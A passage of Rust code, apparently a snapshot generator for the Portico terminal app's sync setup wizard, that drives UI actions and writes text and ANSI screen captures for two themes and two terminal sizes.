                    settings: 3,
                    conflicts: 2,
                    needs_newer: 1,
                    rejoin: false,
                },
                Instant::now(),
            );
        }),
        ("wizard-saved", |a| {
            wizard_at_folder(a);
            a.update(Action::SyncProbed {
                folder: "~/Dropbox/Portico".into(),
                result: Ok(portico_core::sync::FolderProbe::Usable),
            });
            a.update(Action::SyncWizardKey(key(KeyCode::Enter)));
            a.update(Action::SyncGenerated(
                portico_core::sync::generate_passphrase().map_err(|e| e.summary()),
            ));
            a.update(Action::SyncWizardKey(key(KeyCode::Enter)));
        }),
    ];
    for (theme, id) in [("obsidian", "obsidian"), ("marble", "marble")] {
        for (cols, rows) in [(80u16, 24u16), (120, 36)] {
            for (name, setup) in &screens {
                let mut app = synced_app();
                app.theme.fixed = portico_theme::Theme::by_id(id);
                setup(&mut app);
                let base = dir.join(format!("{name}-{theme}-{cols}x{rows}"));
                std::fs::write(base.with_extension("txt"), text(&mut app, cols, rows)).unwrap();
                std::fs::write(base.with_extension("ans"), ansi(&mut app, cols, rows)).unwrap();
            }
        }
    }
}

fn wizard_at_folder(app: &mut App) {
    app.sync.overview = Some(SyncOverview {
        status: SyncStatus::Disabled,
        folder: None,
        device: None,
        remember_key: true,
    });
    app.update(Action::OpenSync);
    app.update(Action::SyncKey(key(KeyCode::Enter)));
    app.update(Action::SyncWizardKey(key(KeyCode::Enter)));
    for c in "~/Dropbox/Portico".chars() {
        app.update(Action::SyncWizardKey(key(KeyCode::Char(c))));
    }
    app.update(Action::SyncWizardKey(key(KeyCode::Enter)));
}
